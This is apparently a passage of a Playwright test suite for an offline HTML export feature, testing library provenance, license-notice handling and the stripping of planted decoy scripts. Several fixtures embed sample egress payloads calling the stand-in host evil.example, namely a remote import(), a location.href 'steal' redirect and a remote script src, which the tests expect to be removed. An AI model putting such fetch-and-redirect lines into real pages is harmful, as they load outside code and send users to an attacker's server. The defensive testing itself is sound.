      name: "licensing: a copy rejected by a gate is not reported as merely unlicensed",
      // Two marked copies: the first carries a valid notice but fails gate 3, the second passes
      // every gate but has no notice. Licensing was NOT the sole blocker, so naming it would send
      // the user after a licence when a copy was actually refused as unsafe.
      head: FORGED_NOTICE
        + '\n<script data-cmh-offline-lib="mermaid">/* cmh-rejected-egress */ import("https://evil.example/x.js").catch(function () {});</script>'
        + '\n<script data-cmh-offline-lib="mermaid">/* cmh-then-unlicensed */ window.__forged = 6;</script>',
      body: "",
    },
    {
      name: "licensing: an unlicensed copy of another library does not mask this one's failure",
      // The flags are per library, so a notice-less Chart.js marker must not make the mermaid this
      // document actually needs report a licensing cause it does not have.
      head: '<script data-cmh-offline-lib="chartjs">/* cmh-forged-other-lib */ window.__forged = 7;</script>',
      body: "",
      toast: /missing the vendored mermaid bundle/i,
    },
    {
      name: "licensing: a marker outside the head is not a candidate, so it does not mask the licence",
      // Gate 1 is the LOCATION filter that decides what a candidate IS - the exporter only ever
      // appends to <head> - so a body-placed marker is authored content, not a copy this exporter
      // refused. It must NOT downgrade the message: the head copy is the only candidate, and
      // licensing genuinely is the only thing blocking it.
      body: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-body-marker */ window.__forged = 10;</script>',
      head: '<script data-cmh-offline-lib="mermaid">/* cmh-head-unlicensed */ window.__forged = 11;</script>',
      toast: /inlined mermaid library[\s\S]*no MIT license notice[\s\S]*source document that still carries the vendored payload/i,
    },
    {
      name: "licensing: the error names the library it could not re-emit, not the other one",
      // This document needs BOTH libraries and neither inlined copy is licensed. Chart.js is
      // resolved first, so its name - not mermaid's - must be the one in the message.
      content: FORGERY_CONTENT + '\n<figure class="chart"><canvas id="forge-chart"></canvas></figure>',
      head: '<script data-cmh-offline-lib="chartjs">/* cmh-forged-both-a */ window.__forged = 8;</script>'
        + '\n<script data-cmh-offline-lib="mermaid">/* cmh-forged-both-b */ window.__forged = 9;</script>',
      body: "",
      toast: /inlined Chart\.js library[\s\S]*no MIT license notice[\s\S]*source document that still carries the vendored payload/i,
    },
  ];

  // Registered ONCE: a per-iteration route would stack a handler per case on the shared page.
  await page.route(/^https?:\/\//, (route) => route.abort());
  for (const forgery of forgeries) {
    const staged = stageContent((forgery.content || FORGERY_CONTENT) + forgery.body, { key: "cmh-offline-forge", source: "offline-forge.html" });
    const downloads = [];
    const onDownload = (d) => downloads.push(d);
    try {
      const html = withoutVendoredPayload(fs.readFileSync(staged.html, "utf8"))
        .replace("</head>", forgery.head + "\n</head>");
      fs.writeFileSync(staged.html, html);

      await page.goto(fileUrl(staged.html));
      await ready(page);
      // Listen for THIS case only, so a late download can never be attributed to another case.
      page.on("download", onDownload);
      await openToolbarMenu(page);
      await page.locator("#btnExportOfflineTop").click();

      const toast = page.locator("#toast");
      await expect(toast, forgery.name).toContainText(forgery.toast || /missing the vendored/i, { timeout: 15000 });
      // An export failure must still be ON SCREEN when it is read, and be announced assertively.
      // `toContainText` matches the element's text even after the toast has faded, and the toast is
      // hidden by OPACITY (so Playwright's `toBeVisible` is a tautology here) - the `show` class is
      // the only thing that discriminates a live toast from a faded one.
      await expect(toast, forgery.name).toHaveClass(/\bshow\b/);
      await expect(toast, forgery.name).toHaveAttribute("role", "alert");
      if (forgery.stillShownAfterMs) {
        await page.waitForTimeout(forgery.stillShownAfterMs);
        await expect(toast, forgery.name).toHaveClass(/\bshow\b/);
      }
      expect(downloads, forgery.name).toHaveLength(0);
    } finally {
      page.off("download", onDownload);
      fs.rmSync(staged.dir, { recursive: true, force: true });
    }
  }
});

test("CMH-OFFLINE-07: the last qualifying inlined library wins over one planted before it", async ({ page }) => {
  test.setTimeout(90000);
  // This exporter appends the library as the head's LAST child, so a qualifying copy planted
  // earlier must never displace the genuine one - that would "succeed" with a diagram that never
  // renders. The two notice-carrying copies below satisfy every provenance gate, so only the
  // ordering rule separates them; the leading notice-less copy also pins that an unlicensed capture
  // does not poison the winning one (it must neither be emitted nor displace the genuine copy).
  const staged = stageContent(FORGERY_CONTENT, { key: "cmh-offline-lastwins", source: "offline-lastwins.html" });
  try {
    const unlicensed = '<script data-cmh-offline-lib="mermaid">/* cmh-planted-unlicensed */ window.__unlicensed = 1;</script>';
    const decoy = FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-planted-early */ window.__early = 1;</script>';
    const genuine = "<!-- Third-party notice - mermaid is bundled inline for offline use under the MIT License:\nGENUINE LICENSE TEXT\n-->"
      + '\n<script data-cmh-offline-lib="mermaid">/* cmh-genuine-late */ window.__late = 1;</script>';
    const html = withoutVendoredPayload(fs.readFileSync(staged.html, "utf8"))
      .replace("</head>", unlicensed + "\n" + decoy + "\n" + genuine + "\n</head>");
    fs.writeFileSync(staged.html, html);

    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    expect(exportedHtml, "the last qualifying copy travels").toContain("cmh-genuine-late");
    expect(exportedHtml, "the earlier planted copy does not").not.toContain("cmh-planted-early");
    expect(exportedHtml, "the notice-less copy does not").not.toContain("cmh-planted-unlicensed");
    expect(exportedHtml).toContain("GENUINE LICENSE TEXT");
    expect(exportedHtml).not.toContain("FORGED LICENSE TEXT");
    // Still exactly one of each, so ordering did not turn into duplication.
    expect((exportedHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});
test("CMH-OFFLINE-07: the vendored payload wins over a copy already in the document", async ({ page }) => {
  test.setTimeout(90000);
  // The captured copy is a FALLBACK for a document whose payload is gone, never a substitute for a
  // fresh one. With a payload present the export must inline the vendored bytes and the planted
  // copy must not survive anywhere in the output.
  const staged = stageContent(FORGERY_CONTENT, { key: "cmh-offline-precedence", source: "offline-precedence.html" });
  try {
    const html = fs.readFileSync(staged.html, "utf8").replace(
      "</head>",
      FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-planted-copy */ window.__planted = true;</script>\n</head>');
    fs.writeFileSync(staged.html, html);

    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    expect(exportedHtml, "the planted copy must not survive").not.toContain("cmh-planted-copy");
    expect(exportedHtml).not.toContain("FORGED LICENSE TEXT");
    // The real vendored library and its real notice travelled instead, exactly once each.
    expect((exportedHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
    expect(exportedHtml).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

// The vendored payload is INFRASTRUCTURE, not content: `tools/authoring/vendored_libs.py` places it
// immediately before `</body>`, i.e. AFTER the content root, while the SHAREABLE template still
// carries it in the head. Mirror the finalized placement so an authored decoy inside the content
// region comes FIRST in document order - which is exactly what a document-order lookup would take.
// Cut and re-insert by INDEX (not a replace() pattern): this is a fixture moving one known element,
// not a sanitizer, and a regex here reads to CodeQL as incomplete sanitization.
function withPayloadAfterContent(html) {
  const idAt = html.indexOf('id="cmhVendoredRichLibs"');
  if (idAt < 0) throw new Error("fixture has no vendored payload to move");
  const openAt = html.lastIndexOf("<script", idAt);
  const closeAt = html.indexOf("</script>", idAt);
  if (openAt < 0 || closeAt < openAt) throw new Error("could not bound the vendored payload");
  const block = html.slice(openAt, closeAt + "</script>".length);
  const rest = html.slice(0, openAt) + html.slice(closeAt + "</script>".length);
  const bodyEnd = rest.lastIndexOf("</body>");
  if (bodyEnd < 0) throw new Error("fixture has no closing body tag");
  return rest.slice(0, bodyEnd) + block + "\n" + rest.slice(bodyEnd);
}

// Rewrite ONE field of the real payload, leaving the library bytes intact - the shape a minifier or
// a deliberate edit leaves behind. Parsed and re-serialized rather than pattern-edited so the
// surrounding megabyte of base64 is untouched.
function withPayloadField(html, key, value) {
  const idAt = html.indexOf('id="cmhVendoredRichLibs"');
  if (idAt < 0) throw new Error("fixture has no vendored payload to edit");
  const openEnd = html.indexOf(">", idAt) + 1;
  const closeAt = html.indexOf("</script>", openEnd);
  if (openEnd <= 0 || closeAt < openEnd) throw new Error("could not bound the vendored payload");
  const payload = JSON.parse(html.slice(openEnd, closeAt));
  if (!(key in payload)) throw new Error("fixture payload has no " + key);
  payload[key] = value;
  return html.slice(0, openEnd) + JSON.stringify(payload) + html.slice(closeAt);
}

// A duplicate content-root id planted in the authored content region. It is legal HTML and
// `getElementById` silently takes the first match, so with a first-match lookup the boundary is
// whichever root happens to come first and the "outside the content root" test stops meaning
// anything. There is no second payload here: the ONLY thing that can refuse this document is the
// requirement that exactly one element carries the content-root id.
const DUPLICATE_ROOT_CONTENT = FORGERY_CONTENT + '\n<div id="commentRoot" hidden></div>';

const DECOY_LIB_CODE = "/* cmh-decoy-lib */ window.__decoyLib = 1;";
const DECOY_LICENSE = "DECOY PAYLOAD LICENSE TEXT";
const MERMAID_COPYRIGHT = "Copyright (c) 2014 - 2022 Knut Sveidqvist";

function payloadBlock(license) {
  return '<script type="application/json" id="cmhVendoredRichLibs">'
    + JSON.stringify({
      encoding: "gzip+base64",
      mermaidGzipBase64: zlib.gzipSync(Buffer.from(DECOY_LIB_CODE)).toString("base64"),
      chartjsGzipBase64: zlib.gzipSync(Buffer.from(DECOY_LIB_CODE)).toString("base64"),
      mermaidLicense: license,
      chartjsLicense: license,
    })
    + "</script>";
}

// A captured library copy that satisfies every provenance gate of CMH-OFFLINE-07, so only the
// notice rule separates the licensed form from the noticeless one.
function capturedMermaidCopy(marker, withNotice) {
  const script = '<script data-cmh-offline-lib="mermaid">/* ' + marker + " */ window." + marker.replace(/-/g, "_") + " = 1;</script>";
  return withNotice ? FORGED_NOTICE + "\n" + script : script;
}

// A document whose content needs mermaid AND carries an authored decoy payload block ahead of the
// real one. `extraContent` adds further authored markup inside the content region.
function stageDecoyPayloadDoc(key, extraContent) {
  const content = FORGERY_CONTENT + "\n" + payloadBlock(DECOY_LICENSE) + "\n" + (extraContent || "");
  const staged = stageContent(content, { key: key, source: key + ".html" });
  const html = withPayloadAfterContent(fs.readFileSync(staged.html, "utf8"));
  // The real payload must end up AFTER the content, with the decoy inside it: the fixture only
  // reproduces the hazard (a document-order lookup taking the decoy) if both hold.
  expect(html.indexOf(DECOY_LICENSE), "decoy precedes the real payload").toBeLessThan(
    html.lastIndexOf('id="cmhVendoredRichLibs"'));
  expect(html.lastIndexOf('id="cmhVendoredRichLibs"'), "the real payload follows the content")
    .toBeGreaterThan(html.indexOf(CONTENT_END));
  fs.writeFileSync(staged.html, html);
  return staged;
}

async function expectExportRefused(page, staged, pattern, label) {
  const downloads = [];
  const onDownload = (d) => downloads.push(d);
  try {
    await page.goto(fileUrl(staged.html));
    await ready(page);
    page.on("download", onDownload);
    await openToolbarMenu(page);
    await page.locator("#btnExportOfflineTop").click();
    // The toast text IS the assertion that the export failed; it auto-hides after 3s, so do not
    // chain a separate visibility check that could race that timer. SOFT assertions so a table of
    // cases reports every failure instead of hiding the later ones behind the first.
    await expect.soft(page.locator("#toast"), label).toContainText(pattern, { timeout: 15000 });
    expect.soft(downloads, label).toHaveLength(0);
  } finally {
    page.off("download", onDownload);
  }
}

test("CMH-OFFLINE-08: an authored decoy vendored payload never displaces the real one", async ({ page }) => {
  test.setTimeout(90000);
  // The payload is resolved as INFRASTRUCTURE - a payload-id script OUTSIDE the content root - not as
  // "the first match in document order". A document-order lookup takes an AUTHORED decoy planted
  // inside the content region, inflates its compressed bytes, and inlines them into an export whose
  // own CSP is `script-src 'unsafe-inline'`, so document-supplied code runs in a file the recipient
  // believes is a clean skill-generated export.
  const staged = stageDecoyPayloadDoc("cmh-offline-decoy");
  try {
    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    // The decoy's bytes are gzipped inside its JSON, so this literal can only appear if they were
    // inflated and inlined as code.
    expect(exportedHtml, "the decoy payload's bytes must never be inlined").not.toContain("cmh-decoy-lib");
    expect((exportedHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
    const notice = [...exportedHtml.matchAll(/<!--([\s\S]*?)-->/g)]
      .map((m) => m[1]).find((c) => c.includes("Third-party notice - mermaid"));
    expect(notice, "the emitted notice is the real one, not the decoy's").toContain(MERMAID_COPYRIGHT);
    expect(notice).not.toContain(DECOY_LICENSE);
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

test("CMH-OFFLINE-08: payload resolution fails closed when it cannot be identified", async ({ page }) => {
  test.setTimeout(180000);
  // Ambiguity is NOT absence. Absence is the ordinary re-export case, which legitimately falls back
  // to the library copies already inlined in the file - so reporting a second, unidentifiable
  // candidate as "no payload" would quietly hand the export to document-supplied bytes, the very
  // substitution this rule exists to prevent. Each case below is otherwise exportable.
  const cases = [
    {
      name: "two infrastructure payload blocks",
      build: (html) => withPayloadAfterContent(html).replace("</head>", payloadBlock(DECOY_LICENSE) + "\n</head>"),
    },
    {
      name: "two payload blocks while the document also carries a captured copy",
      // Without a distinct ambiguous state this one SUCCEEDS on document-supplied bytes: the
      // resolver reports "absent" and lib() falls through to the captured copy.
      build: (html) => withPayloadAfterContent(html)
        .replace("</head>", payloadBlock(DECOY_LICENSE) + "\n" + capturedMermaidCopy("cmh-captured-fallback", true) + "\n</head>"),
    },
    {
      name: "a planted duplicate content root leaves no verifiable boundary",
      // Discriminating on the BOUNDARY rule alone: there is exactly one payload block, so nothing
      // but "exactly one element carries the content-root id" can refuse this document. With a
      // first-match lookup the export just proceeds against whichever root came first.
      content: DUPLICATE_ROOT_CONTENT,
      build: (html) => withPayloadAfterContent(html),
    },
  ];

  await page.route(/^https?:\/\//, (route) => route.abort());
  for (const c of cases) {
    const staged = stageContent(c.content || FORGERY_CONTENT, { key: "cmh-offline-ambiguous", source: "offline-ambiguous.html" });
    try {
      fs.writeFileSync(staged.html, c.build(fs.readFileSync(staged.html, "utf8")));
      await expectExportRefused(page, staged, /cannot identify the vendored/i, c.name);
    } finally {
      fs.rmSync(staged.dir, { recursive: true, force: true });
    }
  }
});

test("CMH-OFFLINE-08: no infrastructure payload block survives an export, authored content does", async ({ page }) => {
  test.setTimeout(90000);
  // An Offline export CONSUMES the payload and removes it - every infrastructure copy, including one
  // parked in a `<template>` (which `querySelectorAll` does not descend into, yet serialization
  // preserves and a script adopted out of a template runs). What it must NOT remove is a payload-id
  // script inside the content root: an authored document may show one as an EXAMPLE, the authoring
  // tool refuses to cut it for that reason, and deleting it would drop content and shift every
  // comment anchor measured after it. Preserving it is not a free pass either - such a script is
  // authored content, so it faces the same network-import strip as any other authored script.
  const authoredTemplate = "<template>" + payloadBlock("CONTENT TEMPLATE LICENSE") + "</template>";
  const authoredLoader = '<script id="cmhVendoredRichLibs">/* cmh-authored-loader */ import("https://evil.example/x.js");</script>';
  const staged = stageDecoyPayloadDoc("cmh-offline-payloadstrip", authoredTemplate + "\n" + authoredLoader);  try {
    const html = fs.readFileSync(staged.html, "utf8")
      .replace("</head>", "<template>" + payloadBlock("TEMPLATE PARKED LICENSE") + "</template>\n</head>");
    fs.writeFileSync(staged.html, html);

    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    // The authored blocks inside the content region survive - the plain one and the one inside an
    // authored template - and nothing else does.
    const begin = exportedHtml.indexOf(CONTENT_BEGIN);
    const end = exportedHtml.indexOf(CONTENT_END);
    expect(begin).toBeGreaterThan(-1);
    expect(end).toBeGreaterThan(begin);
    const remaining = [...exportedHtml.matchAll(/id="cmhVendoredRichLibs"/g)].map((m) => m.index);
    expect(remaining, "only the authored copies remain").toHaveLength(2);
    remaining.forEach(function (at) {
      expect(at, "a surviving block is authored content").toBeGreaterThan(begin);
      expect(at).toBeLessThan(end);
    });
    expect(exportedHtml).toContain(DECOY_LICENSE);
    expect(exportedHtml, "a template inside the content is authored content too").toContain("CONTENT TEMPLATE LICENSE");
    // The template-parked infrastructure copy is gone, and so is the real payload: its license text
    // now appears exactly once, as the emitted notice.
    expect(exportedHtml, "a template-parked payload must not ride along").not.toContain("TEMPLATE PARKED LICENSE");
    expect((exportedHtml.match(/Copyright \(c\) 2014 - 2022 Knut Sveidqvist/g) || []).length).toBe(1);
    // Preserved as content, but not exempt from the strips every authored script faces.
    expect(exportedHtml, "an authored script that borrows the payload id gets no free pass")
      .not.toContain("evil.example");
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

test("CMH-OFFLINE-08: a vendored library whose MIT notice is missing is refused, not shipped", async ({ page }) => {
  test.setTimeout(180000);
  // MIT requires the notice to accompany a redistributed copy, and an Offline export IS a
  // redistribution. The library bytes and their notice therefore travel as ONE unit, from whichever
  // source is chosen - and there is deliberately no cross-source fallback on the notice alone, or
  // anyone who can strip a notice could force the document's own copy to be used instead.
  const cases = [
    {
      name: "the payload's notice text was stripped",
      build: (html) => withPayloadField(html, "mermaidLicense", ""),
      expected: /missing the MIT notice for the vendored mermaid/i,
    },
    {
      name: "the payload's notice is not a string",
      // `String({})` is "[object Object]" - not blank, so a coercing check would emit it AS the notice.
      build: (html) => withPayloadField(html, "mermaidLicense", {}),
      expected: /missing the MIT notice for the vendored mermaid/i,
    },
    {
      name: "a captured copy's notice cannot rescue a noticeless payload",
      build: (html) => withPayloadField(html, "mermaidLicense", "")
        .replace("</head>", capturedMermaidCopy("cmh-captured-rescue", true) + "\n</head>"),
      expected: /missing the MIT notice for the vendored mermaid/i,
    },
    {
      name: "the Chart.js notice is required on its own path",
      content: CONTENT,
      build: (html) => withPayloadField(html, "chartjsLicense", ""),
      expected: /missing the MIT notice for the vendored Chart\.js/i,
    },
  ];

  await page.route(/^https?:\/\//, (route) => route.abort());
  for (const c of cases) {
    const staged = stageContent(c.content || FORGERY_CONTENT, { key: "cmh-offline-nonotice", source: "offline-nonotice.html" });
    try {
      fs.writeFileSync(staged.html, c.build(fs.readFileSync(staged.html, "utf8")));
      // The failure names the missing NOTICE - the actual gap - not a bundle the document carries.
      await expectExportRefused(page, staged, c.expected, c.name);
    } finally {
      fs.rmSync(staged.dir, { recursive: true, force: true });
    }
  }
});

test("CMH-OFFLINE-08: a noticeless captured copy never displaces a licensed one", async ({ page }) => {
  test.setTimeout(90000);
  // Capture is last-match-wins, so recording a noticeless copy unconditionally would let a planted
  // marker with no notice overwrite the genuine pair and turn a legitimate re-export into a
  // permanent refusal. The licensed copy wins and the export still succeeds.
  const staged = stageContent(FORGERY_CONTENT, { key: "cmh-offline-noticeless", source: "offline-noticeless.html" });
  try {
    const html = withoutVendoredPayload(fs.readFileSync(staged.html, "utf8"))
      .replace("</head>", capturedMermaidCopy("cmh-licensed-copy", true) + "\n"
        + capturedMermaidCopy("cmh-noticeless-copy", false) + "\n</head>");
    fs.writeFileSync(staged.html, html);

    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    expect(exportedHtml, "the licensed copy travels").toContain("cmh-licensed-copy");
    expect(exportedHtml, "the noticeless copy does not").not.toContain("cmh-noticeless-copy");
    expect((exportedHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

// A chart canvas the built-in renderer CAN draw, so the library travels only on script evidence.
const BORROWED_ID_CHART_CONTENT = `
<h1>Authored script that borrows the payload id</h1>
<p id="borrow-note">The chart below is drawn by an author script, not the built-in renderer.</p>
<figure class="chart">
  <div class="chart-wrap cm-skip" style="position: relative; height: 180px;">
    <canvas class="cmh-chart" id="borrowChart" width="360" height="180" role="img" aria-label="bar chart"
            data-cmh-chart-points='[{"label":"one","value":4},{"label":"two","value":9}]'></canvas>
  </div>
  <figcaption>Chart drawn by an author script.</figcaption>
</figure>
<script id="cmhVendoredRichLibs">
/* cmh-authored-chart */
(function () { if (typeof Chart === "undefined") return; new Chart(document.getElementById("borrowChart"), { type: "bar", data: { labels: [], datasets: [] } }); })();
</script>`;

test("CMH-OFFLINE-08: an authored script that borrows the payload id still counts as chart evidence", async ({ page }) => {
  test.setTimeout(90000);
  // The strip preserves a payload-id script inside the content root as authored content, so the
  // chart-evidence scan must stop exempting that id too: otherwise such a script survives into the
  // export while the library it calls is judged unnecessary, and the offline file breaks at load.
  // The canvas here IS drawable by the built-in renderer, so only the script's `Chart` reference can
  // provision the library.
  const staged = stageContent(BORROWED_ID_CHART_CONTENT, { key: "cmh-offline-borrowid", source: "offline-borrowid.html" });
  try {
    fs.writeFileSync(staged.html, withPayloadAfterContent(fs.readFileSync(staged.html, "utf8")));
    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    expect(exportedHtml, "the authored chart script survives").toContain("cmh-authored-chart");
    expect(exportedHtml, "so the library it calls must travel with it").toContain('data-cmh-offline-lib="chartjs"');
    expect((exportedHtml.match(/Third-party notice - Chart\.js/g) || []).length).toBe(1);
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

// The layer's own id-bearing data blocks are DATA, and their text is reviewer-written, so the egress
// strips must not read a quoted example inside one as code. That exemption used to be claimed by ID
// ALONE and tested BEFORE the runnable-type test, so a decoy that merely BORROWED one of the ids ran
// in the exported file untouched by either strip - no aliasing and no obfuscation, which made it
// cheaper than every residual CMH-OFFLINE-05 lists.
const RESERVED_DATA_IDS = ["embeddedComments", "handledCommentIds", "commentableHtmlLayer", "reviewedSections"];
// The vendored payload id is deliberately NOT one of them: it is infrastructure resolved by POSITION
// (CMH-OFFLINE-07), so a script that merely borrows it is authored content and must clear the same
// egress scan as any other script. Pinned here beside the exemption so the boundary cannot drift.
const PAYLOAD_DECOY_ID = "cmhVendoredRichLibs";

function reservedIdDecoy(id) {
  return [
    '<script type="text/javascript" id="' + id + '">',
    "(function () {",
    "  window.__cmhReservedDecoysRan = window.__cmhReservedDecoysRan || [];",
    '  window.__cmhReservedDecoysRan.push("' + id + '");',
    '  import("https://evil.example/decoy-' + id + '.js").catch(function () {});',
    '  if (location.protocol === "file:") location.href = "https://evil.example/steal-' + id + '";',
    "})();",
    "</script>",
  ].join("\n");
}

const RESERVED_DECOY_CONTENT = [
  "<h1>Reserved-id decoys</h1>",
  '<p id="decoy-note">Borrowing a reserved layer id must not buy a script an exemption.</p>',
].concat(RESERVED_DATA_IDS.concat([PAYLOAD_DECOY_ID]).map(reservedIdDecoy)).concat([
  // A reserved-id block that also LOADS from the network. Neutralizing it does not save it - a
  // remote load is precisely what the strip exists to take away - so it must be removed, and the
  // kept-as-inert-data count must not claim it survived. That is what forces the count to be taken
  // AFTER the strips rather than at neutralization time.
  '<script type="text/javascript" id="reviewedSections" src="https://evil.example/decoy-src.js">',
  "/* cmh-decoy-with-src */",
  "</script>",
]).join("\n");

test("CMH-OFFLINE-04: a decoy runnable script cannot bypass the offline strips by borrowing a reserved layer id", async ({ page, browser }) => {
  test.setTimeout(90000);
  // Served over http so the beacons are armed only in the exported file (they test for `file:`),
  // exactly as the CMH-OFFLINE-05 navigation spec does.
  const staged = stageContent(RESERVED_DECOY_CONTENT, { key: "cmh-offline-reserved-decoys", source: "offline-reserved-decoys.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    // A reserved DATA block is never deleted: it may hold review state, so the export keeps the
    // bytes and takes away only the ability to run them...
    for (const id of RESERVED_DATA_IDS) {
      expect(exportedHtml, "decoy text for " + id + " is kept as data").toContain("decoy-" + id + ".js");
    }
    // ...while a script that borrows the PAYLOAD id is ordinary content and is stripped for its
    // egress like any other script, which is the boundary CMH-OFFLINE-07 draws.
    expect(exportedHtml, "the payload id earns no exemption").not.toContain("decoy-" + PAYLOAD_DECOY_ID + ".js");
    // ...and a reserved-id block that LOADS from the network is removed rather than repaired, so
    // the kept-as-inert count must not include it. Counting at neutralization time would.
    expect(exportedHtml, "a reserved-id script with a network src is removed").not.toContain("cmh-decoy-with-src");
    expect(exportedHtml).not.toContain("decoy-src.js");
    // Both outcomes are named to the author rather than left to be discovered.
    const toast = page.locator("#toast");
    await expect(toast).toContainText(/\b2 scripts that load or navigate to the network were removed\./);
    await expect(toast).toContainText("4 scripts carrying a reserved commentable-html data id were kept as inert data.");

    const exportedPath = path.join(outDir, "offline-reserved-decoys.html");
    fs.writeFileSync(exportedPath, exportedHtml);

    // Exporter and strict validator agree on the EGRESS exemption: neither sees a runnable
    // reserved-id script any more. They do not agree that this file is valid overall, and the
    // exporter never claimed that - a DUPLICATED reserved id is the source document's own
    // pre-existing invalidity, which the export preserves rather than papers over by deleting the
    // author's bytes. Pin exactly that split, so the weaker claim is not mistaken for the stronger.
    let strictOut = "";
    try {
      execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
      throw new Error("the strict validator accepted duplicate reserved ids");
    } catch (e) {
      strictOut = String(e.stdout || "") + String(e.stderr || "") + String(e.message || "");
    }
    expect(strictOut).toMatch(/appears 2 times \(must be unique\)/);
    expect(strictOut, "no egress complaint: the exemption agrees").not.toMatch(/imports a network module/);
    expect(strictOut, "no egress complaint: the exemption agrees").not.toMatch(/direct top-level/);

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    const state = await page2.evaluate((ids) => ({
      ran: window.__cmhReservedDecoysRan || [],
      // Read the TYPE off the live DOM rather than the HTML text: the exported file inlines the
      // layer runtime, whose own comments quote these ids as tag text, and a text scan would match
      // those quotes instead of a real element.
      types: Array.prototype.slice.call(document.querySelectorAll("script[id]"))
        .filter((s) => ids.includes(s.id))
        .map((s) => s.id + ":" + (s.getAttribute("type") || "")),
    }), RESERVED_DATA_IDS);
    expect(state.ran).toEqual([]);
    for (const entry of state.types) {
      expect(entry, "a reserved-id script must be inert data").toMatch(/:application\/json$/);
    }
    // The real blocks are still there, so the assertion above is not vacuously passing on an empty
    // set: the export cannot have deleted the layer's own state.
    expect(state.types.length).toBeGreaterThanOrEqual(RESERVED_DATA_IDS.length);
    expect(page2.url()).toBe(fileUrl(exportedPath));
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

const QUOTED_EGRESS_NOTE = 'Please drop the import("https://evil.example/x.js") loader and the '
  + 'location.href = "https://evil.example/steal" beacon before we ship this.';

test("CMH-OFFLINE-04: a reviewer comment quoting an egress shape survives, and an untyped legacy data block is repaired", async ({ page, browser }) => {
  test.setTimeout(90000);
  // The two directions the reserved-id exemption exists for. A reviewer legitimately quoting an
  // egress shape (this repo's own issue #784 body does exactly that) must not have their comment
  // stripped; and a LEGACY or hand-authored document whose data block carries no `type` must be
  // repaired to inert data, not executed and not deleted - deleting it is the content loss the
  // exemption was protecting against in the first place.
  const CONTENT_WITH_QUOTE = [
    "<h1>Quoted egress</h1>",
    '<p id="quote-note">A reviewer must be able to quote an egress shape in a comment.</p>',
  ].join("\n");
  const staged = stageContent(CONTENT_WITH_QUOTE, { key: "cmh-offline-quoted-egress", source: "offline-quoted-egress.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    const legacy = fs.readFileSync(staged.html, "utf8").replace(
      '<script type="application/json" id="handledCommentIds">',
      '<script id="handledCommentIds">');
